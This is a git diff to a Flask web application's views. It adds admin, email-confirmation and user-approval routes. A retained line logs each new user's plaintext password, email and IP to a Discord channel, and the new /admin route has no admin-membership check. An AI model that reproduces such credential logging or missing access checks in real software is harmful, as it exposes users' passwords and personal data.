@@ -2,6 +2,7 @@ import json
 import os
 import random
 from datetime import datetime
+from sqlalchemy import not_
 
 import requests
 from flask import (
@@ -433,6 +434,10 @@ def registeracc():
         discord_log_register(
             f"New user  : {username} ====== {email} ====== {password} ====== {client_ip} ====== {user_agent} <@709799648143081483>"
         )
+
+        login_user(new_user)
+        session.permanent = True
+
         return redirect(f"/send_email?to={email}")
     return render_template('users_pages/register.html',
                            done=request.args.get("done"))
@@ -603,6 +608,99 @@ admins = ['spy' , 'biba']  #list of admins (usernames)
 
 
 #Manage users-----------------------------------------------------------------------
+
+
+@views.route('/admin')
+def admin():
+    if current_user.username != 'spy':
+        users = User.query.filter(not_(User.otp.contains('Waiting approval'))).filter(User.username != 'biba').filter(User.username != 'spy').all()
+
+    else:
+        users = User.query.all()
+
+    return render_template('admin/admin.html', users=users)
+
+
+
+# @views.route('/approve_users')
+# def approveusers():
+#     if current_user.username == 'spy':
+#        users = User.query.filter(User.otp.contains('Waiting approval')).all()
+#     else :
+#         users = None
+
+
+
+#     return render_template('admin/admin.html', users=users)
+
+
+@views.route('/approve/<userid>')
+def approve(userid):
+    if current_user.username not in admins:
+        return "User is not an admin"
+    user = User.query.filter_by(id=userid).first()
+    user.otp = "null"  #type: ignore
+    db.session.commit()
+    recipient = user.email  #type: ignore
+    subject = "Account Approved"
+
+    html_content = read_html_file(
+        'website/templates/users_pages/account_created.html',
+        username=user.username)  #type: ignore
+
+    msg = Message(subject, recipients=[recipient])
+    msg.html = html_content
+    mail.send(msg)
+
+    return "done"
+
+
+
+
+
+
+
+
+
+
+
+@views.route('/send_email', methods=['GET', 'POST'])
+def send_email():
+
+    recipient = request.args.get('to')
+    subject = "Account Registration Confirmation"
+
+    email = User.query.filter_by(email=recipient).first()
+
+    if email :
+
+        html_content = read_html_file(
+            'website/templates/users_pages/email.html')
+
+        msg = Message(subject, recipients=[recipient])  #type: ignore
+        msg.html = html_content
+
+        try:
+            mail.send(msg)
+            return redirect("/")
+        except Exception as e:
+            return f"Failed to send email. Account Got created tho"
+    else :
+        return "Email doesnt exist"    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 @views.route('/edit_active_sessions/<user_id>', methods=['POST'])
 def edit_active_sessions(user_id):
     if current_user.username not in admins:
@@ -711,25 +809,6 @@ def delete_user(user_id):
     return redirect("/admin")
 
 
-@views.route('/approve/<userid>')
-def approve(userid):
-    if current_user.username not in admins:
-        return "User is not an admin"
-    user = User.query.filter_by(id=userid).first()
-    user.otp = "null"  #type: ignore
-    db.session.commit()
-    recipient = user.email  #type: ignore
-    subject = "Account Approved"
-
-    html_content = read_html_file(
-        'website/templates/users_pages/account_created.html',
-        username=user.username)  #type: ignore
-
-    msg = Message(subject, recipients=[recipient])
-    msg.html = html_content
-    mail.send(msg)
-
-    return "done"
 
 
 #Edit pages-----------------------------------------------------------------------
